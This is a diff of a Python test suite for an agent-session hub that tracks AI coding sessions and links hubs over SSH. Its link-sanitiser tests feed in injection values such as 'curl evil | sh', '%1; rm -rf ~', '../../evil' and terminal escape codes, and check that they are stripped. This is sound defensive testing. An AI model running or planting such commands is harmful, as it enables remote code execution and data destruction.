@@ -15,7 +15,7 @@ import unittest
 import uuid
 from pathlib import Path
 
-from agent_hub import protocol
+from agent_hub import links, protocol
 
 PACKAGE = Path(__file__).resolve().parent.parent
 TIMEOUT = 5
@@ -36,17 +36,6 @@ elif "spawn" in args:
     with open({log!r} + ".spawn", "a") as log:
         log.write(json.dumps(args[args.index("--") + 1:]) + "\\n")
 """
-
-# Logs each call as a JSON line; notify-send then holds its "toast" open like --wait.
-FAKE_TOOL = """#!{python}
-import json, sys, time
-with open({log!r}, "a") as log:
-    log.write(json.dumps(sys.argv[1:]) + "\\n")
-if {hold!r}:
-    print(42, flush=True)
-    time.sleep(30)
-"""
-
 
 # Answers with the classification in its answer file, or fails without one; logs the profile it ran as.
 FAKE_CLAUDE = """#!{python}
@@ -99,10 +88,10 @@ class Client:
 
 
 class Hub:
-    """A daemon on a desktop by default; `headless` drops niri and the toasts, polls the
+    """A daemon on a desktop by default; `headless` drops niri, polls the
     registry and leaves it no runtime dir, as on a server or a Mac."""
 
-    def __init__(self, headless=False):
+    def __init__(self, headless=False, extra=None):
         self.tmp = Path(tempfile.mkdtemp(prefix="agent-hub-test-"))
         self.registry = self.tmp / "sessions"
         self.registry.mkdir()
@@ -117,13 +106,6 @@ class Hub:
             FAKE_NIRI.format(python=sys.executable, fifo=str(fifo), log=str(self.focus_log), sockets=str(self.socket_log))
         )
         niri.chmod(0o755)
-        self.toast_log = self.tmp / "toasts.log"
-        self.close_log = self.tmp / "close.log"
-        tools = {}
-        for name, log, hold in (("notify-send", self.toast_log, True), ("busctl", self.close_log, False)):
-            tools[name] = self.tmp / name
-            tools[name].write_text(FAKE_TOOL.format(python=sys.executable, log=str(log), hold=hold))
-            tools[name].chmod(0o755)
         # The fake claude logs each call's profile, and its prompt to `claude.prompts`.
         self.claude_log = self.tmp / "claude.log"
         self.claude_answer = self.tmp / "claude.answer"
@@ -131,14 +113,14 @@ class Hub:
         claude.write_text(FAKE_CLAUDE.format(python=sys.executable, log=str(self.claude_log), answer=str(self.claude_answer)))
         claude.chmod(0o755)
         config = self.tmp / "config.json"
-        desktop = {"niri": str(niri), "notifySend": str(tools["notify-send"]), "busctl": str(tools["busctl"]),
-                   "terminal": ["ghostty", "--working-directory={cwd}", "-e"]}
+        desktop = {"niri": str(niri), "terminal": ["ghostty", "--working-directory={cwd}", "-e"]}
         config.write_text(json.dumps({
             "registry": str(self.registry),
             "claude": str(claude),
             "git": shutil.which("git"),
             "state": str(self.tmp / "state.json"),
             **({"poll": True} if headless else desktop),
+            **(extra or {}),
         }))
         runtime = self.tmp / "run"
         runtime.mkdir(mode=0o700)
@@ -397,7 +379,7 @@ class SessionTest(HubTest):
 
 
 class HeadlessTest(unittest.TestCase):
-    """A hub with no compositor, no toasts and no runtime dir: the one on a server or a Mac."""
+    """A hub with no compositor and no runtime dir: the one on a server or a Mac."""
 
     def setUp(self):
         self.hub = Hub(headless=True)
@@ -441,9 +423,15 @@ class TurnTest(HubTest):
         self.canaries = 0
 
     def finish(self, answer):
-        self.pi.end(answer)
-        expected = {"blocked": "needs-reply", "failed": "failed", "done": "done"}[answer.split("state: ")[1].split()[0]]
+        """Ends the turn with closing words that fit the verdict, and returns its row."""
+        word = answer.split("state: ")[1].split()[0]
+        self.pi.end(answer, said="Keep the fixture?" if word == "blocked" else "Done.")
+        expected = {"blocked": "needs-reply", "done": "done"}[word]
         return session(self.bar.wait(has_session(self.sid, lambda s: s["state"] == expected)), self.sid)
+
+    def fail(self):
+        self.pi.end("state: done", error=True)
+        return session(self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed")), self.sid)
 
     def focused_row(self, window):
         """This session's row, read off a canary write that makes the hub publish."""
@@ -457,12 +445,28 @@ class TurnTest(HubTest):
         row = self.finish("label: fixture work\nstate: blocked\nask: keep the fixture?\nreply: yes keep it")
         self.assertEqual((row["ask"], row["reply"]), ("keep the fixture?", "yes keep it"))
         self.pi.start()
-        row = self.finish("state: failed\ndid: The fixture still breaks the build.")
-        self.assertEqual(row["reason"], "The fixture still breaks the build.")
+        row = self.finish("state: done\ndid: Kept the old fixture.")
+        self.assertEqual(row["reason"], "Kept the old fixture.")
 
     def test_a_turn_that_ended_on_an_error_failed_whatever_the_model_says(self):
-        self.pi.end("state: done", error=True)
-        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed"))
+        self.fail()
+
+    def test_the_model_cannot_call_a_turn_failed(self):
+        self.pi.end("state: failed\ndid: The fixture still breaks the build.")
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and s["reason"] == "The fixture still breaks the build."))
+
+    def test_the_model_cannot_raise_a_turn_with_no_question_or_request(self):
+        self.pi.end("state: blocked\nask: keep the fixture?", said="Regenerated the fixture.")
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and s["ask"] == ""))
+
+    def test_the_model_can_demote_a_candidate(self):
+        self.pi.end("state: done\ndid: Pointed at the next step.", said="Want to run just switch now?")
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and s["reason"] == "Pointed at the next step."))
+
+    def test_request_words_make_a_candidate_without_a_question_mark(self):
+        self.pi.answer = None
+        self.pi.end(said="Tests pass.\n\nLet me know which branch to use.")
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply" and s["ask"] == "Let me know which branch to use."))
 
     def test_a_turn_is_read_by_pi_with_the_one_prompt(self):
         self.finish("state: done")
@@ -485,7 +489,6 @@ class TurnTest(HubTest):
         self.pi.end("state: done")
         # Looking at it reads the ending, so the row goes idle without a dismissal.
         self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
-        self.assertFalse(self.hub.toast_log.exists())
         self.pi.start()
         self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
 
@@ -508,14 +511,12 @@ class TurnTest(HubTest):
         self.assertEqual((row["state"], row["ask"]), ("needs-reply", "keep the fixture?"))
 
     def test_a_failed_turn_still_wants_you_when_its_window_is_focused(self):
-        self.finish("state: failed")
+        self.fail()
         self.assertEqual(self.focused_row(self.window)["state"], "failed")
 
     def test_toggle_dismisses_and_brings_back_the_focused_sessions_turn(self):
-        self.finish("state: failed")
-        self.hub.niri({"WindowFocusChanged": {"id": self.window}})
-        # Focusing closes the turn's toast, which shows the hub has seen the focus.
-        logged(self.hub.close_log)
+        self.fail()
+        self.focused_row(self.window)
         self.bar.send(op="toggle")
         self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
         self.bar.send(op="toggle")
@@ -528,12 +529,6 @@ class TurnTest(HubTest):
         self.bar.send(op="toggle")
         self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
         self.assertEqual(self.focused_row(self.window)["state"], "done")
-
-    def test_turn_that_ends_unwatched_toasts_until_its_window_is_focused(self):
-        self.finish("state: done")
-        self.assertIn("Done: fixture work", logged(self.hub.toast_log)[0])
-        self.hub.niri({"WindowFocusChanged": {"id": self.window}})
-        self.assertEqual(logged(self.hub.close_log)[0][-1], "42")
 
     def test_a_new_turn_cancels_the_reading_of_the_last_ones_ending(self):
         self.pi.answer = HOLD
@@ -558,7 +553,13 @@ class TurnTest(HubTest):
         self.assertEqual(self.hub.command("find", "old", "FIXTURE").stdout.splitlines(), out)
         self.assertEqual(self.hub.command("find", "darwin").stdout, "")
 
+    def test_a_verdict_flagged_wrong_goes_to_the_work_log(self):
+        self.finish("state: blocked\nask: keep the fixture?\ndid: Regenerated the fixture.")
+        self.bar.send(op="wrong", session=self.sid)
+        eventually(lambda: "wrong needs-reply" in self.hub.command("log", "--since", "1h").stdout)
+        self.assertEqual(self.hub.command("status", "--session-id", self.sid).stdout.split("\t")[0], "needs-reply")
 
+    def test_focus_goes_to_the_sessions_window(self):
         self.bar.send(op="focus", session=self.sid)
         eventually(lambda: self.hub.focused() == [str(self.window)])
 
@@ -571,17 +572,12 @@ def said(text):
     return {"type": "assistant", "message": {"role": "assistant", "content": [{"type": "text", "text": text}]}}
 
 
-def ran(job=None):
-    """A tool call and its result; `job` makes it a background job that hasn't reported back."""
+def ran():
+    """A tool call and its result."""
     result = {"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t1"}]},
-              "toolUseResult": {"backgroundTaskId": job} if job else {"stdout": ""}}
+              "toolUseResult": {"stdout": ""}}
     use = {"type": "assistant", "message": {"role": "assistant", "content": [{"type": "tool_use", "id": "t1", "name": "Bash"}]}}
     return [use, result]
-
-
-def reported(job):
-    return {"type": "queue-operation", "operation": "enqueue",
-            "content": f"<task-notification>\n<task-id>{job}</task-id>\n<status>completed</status>"}
 
 
 class ClaudeTurnTest(HubTest):
@@ -603,9 +599,10 @@ class ClaudeTurnTest(HubTest):
         # A rescan reads every entry, so this message also carries whatever changed in `sid`'s.
         return session(self.bar.wait(has_session("canary")), self.sid)
 
-    def stop(self, entries, session_id=None, **env):
+    def stop(self, entries, session_id=None, name="Stop", tasks=(), payload=None, **env):
         transcript = self.hub.write_transcript(self.sid, entries)
-        event = {"hook_event_name": "Stop", "session_id": session_id or self.sid, "transcript_path": str(transcript)}
+        event = {"hook_event_name": name, "session_id": session_id or self.sid, "transcript_path": str(transcript),
+                 "background_tasks": list(tasks), **(payload or {})}
         self.hub.command("hook", stdin=json.dumps(event), **env)
 
     def test_turn_that_ends_on_a_question_needs_a_reply(self):
@@ -618,7 +615,7 @@ class ClaudeTurnTest(HubTest):
         # overrules it, announcing one turn end twice.
         self.hub.claude_answer.write_text("state: blocked\nask: keep the old fixture?\ndid: Regenerated the fixture.\n")
         bar = self.hub.subscribe()
-        self.stop([prompt("regenerate the fixture"), *ran(), said("Regenerated; the build is green.")])
+        self.stop([prompt("regenerate the fixture"), *ran(), said("Regenerated; the build is green. Keep the old one?")])
         states = []
         while True:
             message = bar.recv()
@@ -628,33 +625,90 @@ class ClaudeTurnTest(HubTest):
             if row["state"] == "needs-reply":
                 break
         self.assertEqual(states[-2:], ["working", "needs-reply"])
-        self.assertEqual(logged(self.hub.toast_log)[0][-2:], ["demo asks", "keep the old fixture?"])
 
     def test_turn_is_the_registered_sessions_after_a_clear_left_the_hook_an_old_id(self):
         self.stop([prompt("rebase it"), said("Want me to push?")], session_id="before-clear", CLAUDE_PID=str(self.proc.pid))
         self.bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply"))
 
-    def test_turn_that_waits_on_its_background_job_is_working_until_the_job_reports(self):
-        job = [prompt("build it"), *ran("b1"), said("The build runs in the background; I'll be notified when it finishes.")]
-        self.stop(job)
-        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working" and s["doing"] == "waiting on 1 background job"))
-        self.stop([*job, reported("b1"), said("Built.")])
+    def test_agent_work_in_flight_is_working_unread_until_it_reports(self):
+        self.hub.claude_answer.write_text("state: done\n")
+        job = [prompt("build it"), *ran(), said("The review runs in the background.")]
+        self.stop(job, tasks=[{"type": "subagent", "status": "running", "description": "Review the hub"}])
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working" and s["doing"] == "Review the hub"))
+        self.assertFalse(self.hub.claude_log.exists())
+        self.stop([*job, said("Reviewed.")])
         self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
 
-    def test_background_server_left_running_does_not_keep_the_session_working(self):
-        self.stop([prompt("show me the site"), *ran("b1"), said("The preview is up at http://localhost:4321.")])
-        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
+    def test_a_question_beats_agent_work_in_flight(self):
+        self.stop([prompt("build it"), said("Want me to push meanwhile?")], tasks=[{"type": "workflow", "description": "Review"}])
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply" and s["ask"] == "Want me to push meanwhile?"))
 
-    def test_claude_decides_whether_a_turn_waits_on_its_jobs(self):
+    def test_a_shell_task_goes_to_the_model_which_can_say_it_waits_on_it(self):
+        self.hub.claude_answer.write_text("state: waiting\ndid: Started the build.\n")
+        self.stop([prompt("build it"), *ran(), said("The build runs.")], tasks=[{"type": "shell", "description": "nix build"}])
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working" and s["doing"] == "nix build"))
+
+    def test_a_server_left_running_is_done_by_the_models_word(self):
         self.hub.claude_answer.write_text("state: done\nask:\ndid: Started the preview server.\n")
-        self.stop([prompt("show me the site"), *ran("b1"), said("Started it; waiting for you to look.")])
+        self.stop([prompt("show me the site"), *ran(), said("Started it.")], tasks=[{"type": "shell", "description": "preview"}])
         self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and s["summary"] == "Started the preview server."))
 
-    def test_long_turn_is_put_to_claude_as_the_sessions_profile(self):
-        self.hub.claude_answer.write_text("state: failed\nask: empty\ndid: The build still fails on darwin.\n")
-        self.stop([prompt("fix the build"), *ran(), said("I changed the overlay.")], CLAUDE_CONFIG_DIR="/profiles/work")
-        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed" and s["summary"] == "The build still fails on darwin."))
+    def test_a_shell_task_without_the_models_word_is_done_unless_it_says_it_waits(self):
+        self.stop([prompt("show me the site"), *ran(), said("The preview is up at http://localhost:4321.")],
+                  tasks=[{"type": "shell", "description": "preview"}])
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
+
+    def test_the_closing_words_of_the_stop_beat_a_transcript_that_lags(self):
+        self.stop([prompt("rebase it"), *ran()], payload={"last_assistant_message": "Rebased.\n\nWant me to push?"})
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply" and s["ask"] == "Want me to push?"))
+
+    def test_a_turn_that_died_on_an_api_error_failed_with_it_as_the_reason(self):
+        self.stop([prompt("rebase it")], name="StopFailure", payload={"error": "rate_limit", "last_assistant_message": "API Error: Rate limit reached"})
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed" and s["reason"] == "API Error: Rate limit reached"))
+        self.assertFalse(self.hub.claude_log.exists())
+
+    def test_every_turn_is_put_to_claude_as_the_sessions_profile(self):
+        self.hub.claude_answer.write_text("state: done\nask: empty\ndid: Answered.\n")
+        self.stop([prompt("what is 2+2?"), said("4")], CLAUDE_CONFIG_DIR="/profiles/work")
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and s["summary"] == "Answered."))
         self.assertEqual(self.hub.claude_log.read_text().split(), ["/profiles/work"])
+
+    def test_an_offer_the_model_leaves_alone_needs_a_reply_and_stays_when_its_reading_fails(self):
+        self.hub.claude_answer.write_text("state: blocked\nask: commit this?\ndid: Fixed it.\n")
+        self.stop([prompt("fix it"), said("Fixed. Want me to commit?")])
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply" and s["ask"] == "commit this?"))
+
+    def running(self):
+        """A session mid-turn, as a fresh subscriber sees it: the shared bar may have heard already."""
+        self.hub.write_session(self.proc.pid, self.sid, status="busy")
+        bar = self.hub.connect()
+        bar.send(op="subscribe")
+        bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
+
+    def test_a_turn_whose_stop_a_restart_missed_is_read_from_its_transcript(self):
+        self.running()
+        state_file = self.hub.tmp / "state.json"
+        eventually(lambda: state_file.exists() and '"ended": null' in state_file.read_text())
+        self.hub.kill()
+        self.hub.write_session(self.proc.pid, self.sid, status="idle")
+        self.hub.write_transcript(self.sid, [prompt("rebase it"), said("Want me to push?")])
+        saved = json.loads(state_file.read_text())
+        saved["sessions"][0]["transcript"] = str(self.hub.tmp / f"{self.sid}.jsonl")
+        state_file.write_text(json.dumps(saved))
+        self.hub.socket.unlink()
+        self.hub.start()
+        bar = self.hub.connect()
+        bar.send(op="subscribe")
+        bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply" and s["ask"] == "Want me to push?"))
+
+    def test_a_turn_still_running_across_a_restart_stays_working_until_its_stop(self):
+        self.running()
+        self.hub.restart()
+        bar = self.hub.connect()
+        bar.send(op="subscribe")
+        bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
+        self.stop([prompt("go"), said("Done.")])
+        bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
 
     def test_finished_turn_survives_a_restart(self):
         self.stop([prompt("rebase it"), said("Want me to push?")])
@@ -769,6 +823,242 @@ class PiTest(HubTest):
         self.attach(answer="")
         state = self.bar.wait(has_session(self.sid, lambda s: s["label"] == "retry flakes"))
         self.assertEqual(state["recent"], [])
+
+
+class AlertTest(HubTest):
+    """What the bar's dot does, end to end."""
+
+    def setUp(self):
+        super().setUp()
+        self.proc = self.hub.process()
+        self.bar = self.hub.subscribe()
+        self.pi = Pi(self.hub, self.sid, self.proc.pid, answer="state: blocked\nask: keep it?")
+        self.bar.wait(has_session(self.sid))
+
+    def asks(self):
+        self.pi.start()
+        self.pi.end(said="Keep it?")
+        return self.bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply"))
+
+    def test_an_ask_pulses_until_the_popout_opens(self):
+        self.assertTrue(session(self.asks(), self.sid)["pulse"])
+        self.bar.send(op="seen")
+        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply" and not s["pulse"]))
+
+    def test_a_known_ask_does_not_pulse_again_after_a_restart(self):
+        self.asks()
+        self.hub.restart()
+        bar = self.hub.connect()
+        bar.send(op="subscribe")
+        pi = Pi(self.hub, self.sid, self.proc.pid, answer="")
+        bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply" and not s["pulse"]))
+        pi.close()
+
+
+class HiddenTest(HubTest):
+    """A session an agent spawned, tracked but kept off the bar."""
+
+    def setUp(self):
+        super().setUp()
+        self.proc = self.hub.process()
+        self.bar = self.hub.subscribe()
+        self.hub.write_session(self.proc.pid, self.sid, status="busy")
+        self.bar.wait(has_session(self.sid))
+        self.transcript = self.hub.write_transcript(self.sid, [prompt("go"), said("Want me to push?")])
+
+    def hook(self, name, **env):
+        event = {"hook_event_name": name, "session_id": self.sid, "transcript_path": str(self.transcript), "prompt": "go"}
+        self.hub.command("hook", stdin=json.dumps(event), **env)
+
+    def test_a_hidden_session_leaves_the_bar_is_counted_and_is_never_read(self):
+        self.hook("SessionStart", AGENT_HUB_HIDDEN="1")
+        state = self.bar.wait(lacks_session(self.sid))
+        self.assertEqual(state["hidden"], 1)
+        self.hook("Stop", AGENT_HUB_HIDDEN="1")
+        self.assertEqual(self.hub.command("status").stdout, "hidden\t1\n")
+        self.assertFalse(self.hub.claude_log.exists())
+
+    def test_a_hidden_pi_keeps_its_own_row_in_its_own_tui(self):
+        proc = self.hub.process()
+        pi = Pi(self.hub, "spawned", proc.pid, answer="label: nope", hidden=True)
+        pi.row(lambda push: push["row"]["id"] == "spawned")
+        pi.start()
+        self.assertEqual(pi.judged, [])
+        self.assertIsNone(session(self.bar.wait(lambda m: m["type"] == "state" and m["hidden"] == 1), "spawned"))
+
+    def test_off_means_the_hooks_do_nothing(self):
+        self.hook("Stop", AGENT_HUB="off")
+        self.hook("SessionStart", AGENT_HUB="off", AGENT_HUB_HIDDEN="1")
+        self.assertIn("working", self.hub.command("status").stdout)
+
+    def test_status_with_no_session_lists_them_all(self):
+        lines = self.hub.command("status").stdout.splitlines()
+        self.assertEqual(lines[0].split("\t")[0], "working")
+        self.assertEqual(json.loads(self.hub.command("status", "--json").stdout)["hidden"], 0)
+
+
+# Stands in for `ssh -T -F config host agent-hub attach`: runs the real attach against the host's hub.
+FAKE_SSH = """#!{python}
+import os, sys
+host = sys.argv[sys.argv.index("-F") + 2]
+os.environ["XDG_RUNTIME_DIR"] = {runtimes!r} + "/" + host
+os.environ["XDG_STATE_HOME"] = {runtimes!r} + "/" + host + "-state"
+with open({log!r}, "a") as log:
+    log.write(" ".join(sys.argv[1:]) + "\\n")
+if os.path.exists({runtimes!r} + "/" + host + ".fail"):
+    sys.exit(open({runtimes!r} + "/" + host + ".fail").read())
+os.chdir({package!r})
+os.execv(sys.executable, [sys.executable, "-m", "agent_hub", "attach", "--control"])
+"""
+
+
+class LinkTest(unittest.TestCase):
+    """A viewer hub with another host's hub piped in, through the real `attach`."""
+
+    def setUp(self):
+        self.far = Hub()
+        self.addCleanup(self.far.stop)
+        self.tmp = Path(tempfile.mkdtemp(prefix="agent-hub-link-"))
+        (self.tmp / "far").symlink_to(self.far.socket.parent.parent)
+        self.ssh_log = self.tmp / "ssh.log"
+        ssh = self.tmp / "ssh"
+        ssh.write_text(FAKE_SSH.format(python=sys.executable, runtimes=str(self.tmp), log=str(self.ssh_log), package=str(PACKAGE)))
+        ssh.chmod(0o755)
+        self.near = Hub(extra={"remotes": ["far"], "ssh": str(ssh), "sshConfig": "/dev/null"})
+        self.addCleanup(self.near.stop)
+        self.sid = str(uuid.uuid4())
+        self.bar = self.near.subscribe()
+        self.proc = self.far.process()
+        self.far_bar = self.far.subscribe()
+        self.pi = Pi(self.far, self.sid, self.proc.pid, answer="label: far work\nstate: blocked\nask: keep it?", cwd="/far/repo")
+        self.rid = f"far:{self.sid}"
+        self.bar.wait(has_session(self.rid))
+
+    def asks(self):
+        self.pi.start()
+        self.pi.end(said="Keep it?")
+        return self.bar.wait(has_session(self.rid, lambda s: s["state"] == "needs-reply"))
+
+    def test_a_session_on_another_host_shows_stamped_by_the_viewer(self):
+        row = session(self.asks(), self.rid)
+        self.assertEqual((row["host"], row["pid"], row["window"], row["ask"], row["reply"]), ("far", None, None, "keep it?", ""))
+        self.assertTrue(row["pulse"])
+
+    def test_the_link_goes_through_its_own_ssh_config_and_says_it_is_up(self):
+        state = self.asks()
+        self.assertEqual(state["links"], [{"host": "far", "status": "up"}])
+        self.assertIn("-T -F /dev/null far agent-hub attach", self.ssh_log.read_text())
+
+    def test_a_viewer_can_dismiss_only_the_turn_it_saw(self):
+        row = session(self.asks(), self.rid)
+        self.bar.send(op="dismiss", session=self.rid, turn=row["turn"] - 1)
+        self.bar.send(op="dismiss", session=self.rid, turn=row["turn"])
+        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "idle"))
+
+    def test_a_hub_that_lists_this_one_does_not_get_its_own_rows_back(self):
+        self.asks()
+        client = self.near.connect()
+        client.send(op="subscribe", local=True)
+        self.assertEqual(client.wait(lambda m: m["type"] == "state")["sessions"], [])
+
+    def test_a_known_turn_stays_quiet_after_the_link_drops_and_a_new_one_pulses(self):
+        self.asks()
+        self.bar.send(op="seen")
+        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "needs-reply" and not s["pulse"]))
+        self.far.restart()
+        self.bar.wait(lambda m: m["type"] == "state" and m["links"][0]["status"] != "up")
+        self.pi = Pi(self.far, self.sid, self.proc.pid, answer="state: blocked\nask: keep it?", cwd="/far/repo")
+        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "needs-reply" and not s["pulse"]), timeout=30)
+        self.pi.start()
+        self.pi.end(said="Keep it?")
+        self.bar.wait(has_session(self.rid, lambda s: s["state"] == "needs-reply" and s["pulse"]), timeout=10)
+
+    def test_enter_on_a_session_in_tmux_opens_a_terminal_on_it(self):
+        self.pi.close()
+        self.bar.wait(lacks_session(self.rid))
+        Pi(self.far, self.sid, self.proc.pid, answer="", tmux="%12")
+        self.bar.wait(has_session(self.rid, lambda s: s.get("tmux") == "%12"))
+        self.bar.send(op="focus", session=self.rid)
+        spawned = logged(Path(str(self.near.focus_log) + ".spawn"))
+        self.assertEqual(spawned[0][-7:], ["ssh", "-t", "far", "tmux", "attach", "-t", "%12"])
+
+    def test_an_ended_session_resumes_over_ssh(self):
+        self.pi.start()
+        self.pi.row(lambda p: p["identity"]["label"] == "far work")
+        self.pi.close()
+        state = self.bar.wait(lambda m: m["type"] == "state" and m["recent"])
+        self.assertEqual(state["recent"][0]["resume"], f"ssh -t far 'cd /far/repo && pi --session {self.sid[:8]}'")
+        self.bar.send(op="resume", session=self.rid)
+        spawned = logged(Path(str(self.near.focus_log) + ".spawn"))
+        self.assertEqual(spawned[0][-4:], ["ssh", "-t", "far", f"cd /far/repo && pi --session {self.sid[:8]}"])
+
+
+class LinkFailureTest(unittest.TestCase):
+    def link_status(self, said):
+        tmp = Path(tempfile.mkdtemp(prefix="agent-hub-link-"))
+        (tmp / "far.fail").write_text(said)
+        ssh = tmp / "ssh"
+        ssh.write_text(FAKE_SSH.format(python=sys.executable, runtimes=str(tmp), log=str(tmp / "ssh.log"), package=str(PACKAGE)))
+        ssh.chmod(0o755)
+        hub = Hub(extra={"remotes": ["far"], "ssh": str(ssh), "sshConfig": "/dev/null"})
+        self.addCleanup(hub.stop)
+        bar = hub.subscribe()
+        return bar.wait(lambda m: m["type"] == "state" and m["links"][0]["status"] != "connecting")["links"][0]["status"]
+
+    def test_each_failure_says_what_it_is(self):
+        self.assertEqual(self.link_status("Permission denied (publickey)."), "auth failed")
+        self.assertEqual(self.link_status("ssh: connect to host far port 22: Connection timed out"), "timeout")
+        self.assertEqual(self.link_status("agent-hub: no hub here"), "no hub")
+        self.assertEqual(self.link_status("ssh: Could not resolve hostname far"), "host down")
+
+
+class AttachFilterTest(unittest.TestCase):
+    def test_only_subscribe_passes_without_control(self):
+        self.assertEqual(links.attach_filter(b'{"op":"subscribe","version":3,"extra":1}', False),
+                         {"op": "subscribe", "local": True, "version": 3})
+        for op in ("dismiss", "turn-start", "focus", "resume", "attach", "demo", "seen"):
+            self.assertIsNone(links.attach_filter(json.dumps({"op": op, "session": "s", "configDir": "/evil"}).encode(), False))
+
+    def test_control_adds_only_dismiss_rebuilt_from_its_fields(self):
+        self.assertEqual(links.attach_filter(b'{"op":"dismiss","session":"s","turn":3,"configDir":"/evil"}', True),
+                         {"op": "dismiss", "session": "s", "turn": 3})
+        self.assertIsNone(links.attach_filter(b'{"op":"turn-start","session":"s","configDir":"/evil"}', True))
+
+    def test_junk_is_dropped(self):
+        self.assertIsNone(links.attach_filter(b"not json", True))
+        self.assertIsNone(links.attach_filter(b"[1]", True))
+
+
+class CleanRowTest(unittest.TestCase):
+    SID = "0f8fad5b-d9cb-469f-a165-70867728950e"
+
+    def row(self, **fields):
+        return {"id": self.SID, "state": "done", "since": 5, "name": "n", "agent": "pi", **fields}
+
+    def test_a_row_with_a_bad_id_or_state_is_refused(self):
+        self.assertIsNone(links.clean_row("far", self.row(id="../../evil")))
+        self.assertIsNone(links.clean_row("far", self.row(id="far:" + self.SID)))
+        self.assertIsNone(links.clean_row("far", self.row(state="pwned")))
+        self.assertIsNone(links.clean_row("far", "nope"))
+
+    def test_control_characters_are_stripped_and_text_capped(self):
+        row = links.clean_row("far", self.row(name="a\x1b]0;x\x07b\x9bc", summary="x" * 9000))
+        self.assertEqual(row["name"], "a ]0;x b c")
+        self.assertEqual(len(row["summary"]), links.TEXT_MAX)
+
+    def test_what_the_host_says_of_pid_window_and_host_is_ignored(self):
+        row = links.clean_row("far", self.row(pid=1, window=7, host="near", reply="sudo rm"))
+        self.assertEqual((row["pid"], row["window"], row["host"], row["reply"]), (None, None, "far", ""))
+
+    def test_a_tmux_pane_or_bridge_that_is_not_one_is_dropped(self):
+        row = links.clean_row("far", self.row(tmux="%1; rm -rf ~", bridge="a/../b"))
+        self.assertNotIn("tmux", row)
+        self.assertNotIn("bridge", row)
+        self.assertEqual(links.clean_row("far", self.row(tmux="%12"))["tmux"], "%12")
+
+    def test_an_ended_sessions_resume_is_built_here(self):
+        item = links.clean_recent("far", {"id": self.SID, "agent": "claude", "cwd": "/a b;rm", "resume": "curl evil | sh"})
+        self.assertEqual(item["resume"], f"""ssh -t far 'cd '"'"'/a b;rm'"'"' && claude --resume {self.SID}'""")
 
 
 class ProtocolTest(HubTest):
@@ -941,12 +1231,6 @@ class WaitingTest(HubTest):
         self.hub.command("hook", stdin=json.dumps(event))
         self.bar.wait(has_session(self.sid, lambda s: s["waitingFor"] == "Bash: rm -rf build && make"))
 
-    def test_waiting_unwatched_toasts_with_its_label(self):
-        self.label("Bash: rm -rf build")
-        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="permission prompt")
-        toast = logged(self.hub.toast_log)[0]
-        self.assertEqual(toast[-2:], ["demo needs you", "Bash: rm -rf build"])
-
     def test_dialog_that_only_shows_something_is_not_asking(self):
         self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="dialog open")
         # A dialog that asks nothing publishes nothing, so read the row off another session's change.
@@ -1051,7 +1335,7 @@ class StatusTest(HubTest):
         self.pi = Pi(self.hub, self.sid, self.proc.pid, answer="label: fixture work\nstate: blocked\nask: keep the fixture?")
         self.pi.start()
         self.pi.row(lambda push: push["identity"]["label"] == "fixture work")
-        self.pi.end()
+        self.pi.end(said="Keep the fixture?")
         self.bar.wait(has_session(self.sid, lambda s: s["state"] == "needs-reply"))
 
     def status(self, *args):
